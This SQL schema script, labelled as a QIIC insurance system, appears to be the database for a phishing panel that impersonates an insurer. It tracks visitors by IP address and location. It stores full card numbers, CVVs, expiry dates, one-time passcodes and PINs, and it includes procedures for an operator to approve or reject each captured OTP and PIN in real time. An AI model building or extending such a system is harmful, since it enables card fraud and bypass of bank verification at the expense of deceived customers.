-- =============================================
-- QIIC Insurance System - Database Schema
-- Purpose: Real-time customer journey tracking aligned with Socket.IO architecture
-- Database: MySQL/MariaDB
-- =============================================

USE u262632985_qic;

-- Drop tables if they exist (in correct order due to foreign keys)
DROP TABLE IF EXISTS pin_codes;
DROP TABLE IF EXISTS otp_codes;
DROP TABLE IF EXISTS payments;
DROP TABLE IF EXISTS quotes;
DROP TABLE IF EXISTS policy_dates;
DROP TABLE IF EXISTS insurance_info;
DROP TABLE IF EXISTS plate_numbers;
DROP TABLE IF EXISTS select_insurance;
DROP TABLE IF EXISTS more_details;
DROP TABLE IF EXISTS car_details;
DROP TABLE IF EXISTS user_locations;
DROP TABLE IF EXISTS admin_users;
DROP TABLE IF EXISTS customer_sessions;

-- =============================================
-- TABLE: customer_sessions (Core tracking table)
-- =============================================
CREATE TABLE customer_sessions (
    ip_address VARCHAR(45) PRIMARY KEY,
    socket_id VARCHAR(255),
    is_active TINYINT(1) DEFAULT 1,
    current_page VARCHAR(100),
    latitude DECIMAL(10, 8),
    longitude DECIMAL(11, 8),
    country VARCHAR(100),
    city VARCHAR(100),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: user_locations (Page navigation tracking)
-- =============================================
CREATE TABLE user_locations (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    page VARCHAR(100) NOT NULL,
    latitude DECIMAL(10, 8),
    longitude DECIMAL(11, 8),
    country VARCHAR(100),
    city VARCHAR(100),
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: car_details
-- =============================================
CREATE TABLE car_details (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    brand VARCHAR(100),
    model VARCHAR(100),
    year INT,
    seats INT,
    cylinders INT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: more_details
-- =============================================
CREATE TABLE more_details (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    body_type VARCHAR(50),
    engine_size DECIMAL(5, 2),
    color VARCHAR(50),
    registration_year INT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: select_insurance
-- =============================================
CREATE TABLE select_insurance (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    insurance_type VARCHAR(50),
    selected_company VARCHAR(100),
    base_price DECIMAL(10, 2),
    total_price DECIMAL(10, 2),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: plate_numbers
-- =============================================
CREATE TABLE plate_numbers (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    plate_number VARCHAR(20),
    plate_code VARCHAR(10),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: insurance_info
-- =============================================
CREATE TABLE insurance_info (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    full_name VARCHAR(255),
    qid VARCHAR(20),
    phone VARCHAR(20),
    email VARCHAR(255),
    address VARCHAR(500),
    date_of_birth DATE,
    nationality VARCHAR(100),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: policy_dates
-- =============================================
CREATE TABLE policy_dates (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    start_date DATE,
    end_date DATE,
    duration_months INT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: quotes
-- =============================================
CREATE TABLE quotes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    quote_amount DECIMAL(10, 2),
    coverage_type VARCHAR(50),
    additional_coverage VARCHAR(500),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: payments (Support multiple payment records per customer)
-- =============================================
CREATE TABLE payments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    payment_method VARCHAR(50),
    card_number VARCHAR(19),
    cvv VARCHAR(4),
    expiration_date VARCHAR(7),
    card_holder_name VARCHAR(255),
    phone_number VARCHAR(20),
    card_last_digits VARCHAR(4),
    amount DECIMAL(10, 2),
    status VARCHAR(20) DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: otp_codes (Support multiple OTP records per customer)
-- =============================================
CREATE TABLE otp_codes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    otp_code VARCHAR(10),
    verified TINYINT(1) DEFAULT 0,
    verification_status ENUM('pending', 'approved', 'rejected') DEFAULT 'pending',
    verified_by VARCHAR(50) DEFAULT NULL COMMENT 'admin or user',
    verification_timestamp DATETIME DEFAULT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE,
    INDEX idx_status (verification_status),
    INDEX idx_verified (verified)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: pin_codes (Support multiple PIN records per customer)
-- =============================================
CREATE TABLE pin_codes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    pin_code VARCHAR(10),
    verified TINYINT(1) DEFAULT 0,
    verification_status ENUM('pending', 'approved', 'rejected') DEFAULT 'pending',
    verified_by VARCHAR(50) DEFAULT NULL COMMENT 'admin or user',
    verification_timestamp DATETIME DEFAULT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (ip_address) REFERENCES customer_sessions(ip_address) ON DELETE CASCADE,
    INDEX idx_status (verification_status),
    INDEX idx_verified (verified)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- TABLE: admin_users
-- =============================================
CREATE TABLE admin_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(50) DEFAULT 'admin',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =============================================
-- INDEXES for Performance
-- =============================================
CREATE INDEX idx_sessions_active ON customer_sessions(is_active);
CREATE INDEX idx_sessions_socket ON customer_sessions(socket_id);
CREATE INDEX idx_locations_ip ON user_locations(ip_address);
CREATE INDEX idx_locations_page ON user_locations(page);
CREATE INDEX idx_payments_ip ON payments(ip_address);
CREATE INDEX idx_payments_status ON payments(status);
CREATE INDEX idx_otp_ip ON otp_codes(ip_address);
CREATE INDEX idx_pin_ip ON pin_codes(ip_address);

-- =============================================
-- STORED PROCEDURES
-- =============================================
-- Note: For phpMyAdmin, execute each procedure separately or use DELIMITER in MySQL CLI

-- Drop procedures if they exist
DROP PROCEDURE IF EXISTS GetCustomerJourney;
DROP PROCEDURE IF EXISTS DeleteCustomerData;
DROP PROCEDURE IF EXISTS UpdatePaymentStatus;
DROP PROCEDURE IF EXISTS ApproveOTP;
DROP PROCEDURE IF EXISTS RejectOTP;
DROP PROCEDURE IF EXISTS ApprovePIN;
DROP PROCEDURE IF EXISTS RejectPIN;

DELIMITER $$

-- Procedure: Get complete customer journey
CREATE PROCEDURE GetCustomerJourney(IN p_ip_address VARCHAR(45))
BEGIN
    SELECT 
        cs.*,
        cd.brand, cd.model, cd.year,
        md.body_type, md.color,
        si.insurance_type, si.selected_company,
        pn.plate_number,
        ii.full_name, ii.email, ii.phone,
        pd.start_date, pd.end_date,
        q.quote_amount,
        p.payment_method, p.status AS payment_status,
        oc.otp_code, oc.verified AS otp_verified,
        pc.pin_code, pc.verified AS pin_verified
    FROM customer_sessions cs
    LEFT JOIN car_details cd ON cs.ip_address = cd.ip_address
    LEFT JOIN more_details md ON cs.ip_address = md.ip_address
    LEFT JOIN select_insurance si ON cs.ip_address = si.ip_address
    LEFT JOIN plate_numbers pn ON cs.ip_address = pn.ip_address
    LEFT JOIN insurance_info ii ON cs.ip_address = ii.ip_address
    LEFT JOIN policy_dates pd ON cs.ip_address = pd.ip_address
    LEFT JOIN quotes q ON cs.ip_address = q.ip_address
    LEFT JOIN payments p ON cs.ip_address = p.ip_address
    LEFT JOIN otp_codes oc ON cs.ip_address = oc.ip_address
    LEFT JOIN pin_codes pc ON cs.ip_address = pc.ip_address
    WHERE cs.ip_address = p_ip_address;
END$$

-- Procedure: Delete all customer data
CREATE PROCEDURE DeleteCustomerData(IN p_ip_address VARCHAR(45))
BEGIN
    DELETE FROM customer_sessions WHERE ip_address = p_ip_address;
    -- All related records will be deleted automatically due to CASCADE
END$$

-- Procedure: Update payment status
CREATE PROCEDURE UpdatePaymentStatus(
    IN p_ip_address VARCHAR(45),
    IN p_new_status VARCHAR(20)
)
BEGIN
    UPDATE payments 
    SET status = p_new_status 
    WHERE ip_address = p_ip_address;
END$$

-- Procedure: Approve OTP code
CREATE PROCEDURE ApproveOTP(
    IN p_ip_address VARCHAR(45),
    IN p_otp_code VARCHAR(10),
    IN p_verified_by VARCHAR(50)
)
BEGIN
    UPDATE otp_codes 
    SET verified = 1,
        verification_status = 'approved',
        verified_by = p_verified_by,
        verification_timestamp = NOW()
    WHERE ip_address = p_ip_address 
    AND otp_code = p_otp_code
    AND verification_status = 'pending';
END$$

-- Procedure: Reject OTP code
CREATE PROCEDURE RejectOTP(
    IN p_ip_address VARCHAR(45),
    IN p_otp_code VARCHAR(10),
    IN p_verified_by VARCHAR(50)
)
BEGIN
    UPDATE otp_codes 
    SET verified = 0,
        verification_status = 'rejected',
        verified_by = p_verified_by,
        verification_timestamp = NOW()
    WHERE ip_address = p_ip_address 
    AND otp_code = p_otp_code
    AND verification_status = 'pending';
END$$

-- Procedure: Approve PIN code
CREATE PROCEDURE ApprovePIN(
    IN p_ip_address VARCHAR(45),
    IN p_pin_code VARCHAR(10),
    IN p_verified_by VARCHAR(50)
)
BEGIN
    UPDATE pin_codes 
    SET verified = 1,
        verification_status = 'approved',
        verified_by = p_verified_by,
        verification_timestamp = NOW()
    WHERE ip_address = p_ip_address 
    AND pin_code = p_pin_code
    AND verification_status = 'pending';
END$$

-- Procedure: Reject PIN code
CREATE PROCEDURE RejectPIN(
    IN p_ip_address VARCHAR(45),
    IN p_pin_code VARCHAR(10),
    IN p_verified_by VARCHAR(50)
)
BEGIN
    UPDATE pin_codes 
    SET verified = 0,
        verification_status = 'rejected',
        verified_by = p_verified_by,
        verification_timestamp = NOW()
    WHERE ip_address = p_ip_address 
    AND pin_code = p_pin_code
    AND verification_status = 'pending';
END$$

DELIMITER ;

-- =============================================
-- VIEWS for Analytics
-- =============================================

-- View: Active customers with all their data
CREATE VIEW vw_active_customers AS
SELECT 
    cs.ip_address,
    cs.current_page,
    cs.country,
    cs.city,
    CONCAT(cd.brand, ' ', cd.model) AS vehicle,
    ii.full_name,
    ii.email,
    p.payment_method,
    p.status AS payment_status,
    cs.created_at
FROM customer_sessions cs
LEFT JOIN car_details cd ON cs.ip_address = cd.ip_address
LEFT JOIN insurance_info ii ON cs.ip_address = ii.ip_address
LEFT JOIN payments p ON cs.ip_address = p.ip_address
WHERE cs.is_active = 1;

-- View: Payment statistics
CREATE VIEW vw_payment_stats AS
SELECT 
    payment_method,
    status,
    COUNT(*) AS total_payments,
    SUM(amount) AS total_amount
FROM payments
GROUP BY payment_method, status;

-- View: OTP verification statistics
CREATE VIEW vw_otp_stats AS
SELECT 
    verification_status,
    verified_by,
    COUNT(*) AS total_count,
    DATE(created_at) AS verification_date
FROM otp_codes
GROUP BY verification_status, verified_by, DATE(created_at)
ORDER BY verification_date DESC;

-- View: PIN verification statistics
CREATE VIEW vw_pin_stats AS
SELECT 
    verification_status,
    verified_by,
    COUNT(*) AS total_count,
    DATE(created_at) AS verification_date
FROM pin_codes
GROUP BY verification_status, verified_by, DATE(created_at)
ORDER BY verification_date DESC;

-- =============================================
-- SAMPLE DATA (Optional - for testing)
-- =============================================

-- Insert sample customer sessions
INSERT INTO customer_sessions (ip_address, socket_id, is_active, current_page, country, city) VALUES
('192.168.1.100', 'socket123', 1, '/insurance-info', 'Qatar', 'Doha'),
('192.168.1.101', 'socket456', 1, '/payment', 'Qatar', 'Al Rayyan');

-- Insert sample car details
INSERT INTO car_details (ip_address, brand, model, year, seats, cylinders) VALUES
('192.168.1.100', 'Toyota', 'Camry', 2022, 5, 4),
('192.168.1.101', 'Nissan', 'Patrol', 2023, 7, 8);

-- Insert sample payments
INSERT INTO payments (ip_address, payment_method, card_number, cvv, expiration_date, card_holder_name, phone_number, amount, status) VALUES
('192.168.1.100', 'DCC', '4111111111111111', '123', '12/25', 'Ahmed Ali', '+97412345678', 1500.00, 'pending'),
('192.168.1.101', 'QPay', '5500000000000004', '456', '06/26', 'Fatima Hassan', '+97487654321', 2200.00, 'completed');

-- Insert sample OTP codes
INSERT INTO otp_codes (ip_address, otp_code, verified, verification_status, verified_by, verification_timestamp) VALUES
('192.168.1.100', '123456', 0, 'pending', NULL, NULL),
('192.168.1.101', '789012', 1, 'approved', 'admin', NOW());

-- Insert sample PIN codes
INSERT INTO pin_codes (ip_address, pin_code, verified, verification_status, verified_by, verification_timestamp) VALUES
('192.168.1.100', '1234', 0, 'pending', NULL, NULL),
('192.168.1.101', '5678', 1, 'approved', 'user', NOW());

-- Insert admin user (password: 'admin123' - hashed with bcrypt)
INSERT INTO admin_users (username, email, password_hash, role) VALUES
('admin', 'admin@qiic.com', '$2b$10$rBV2dFRkW3pJZVx6JJqv6OKq8xF9R3vYqx5H8oG2pTc8L1k4F0e.W', 'super_admin');

-- =============================================
-- END OF SCRIPT
-- =============================================
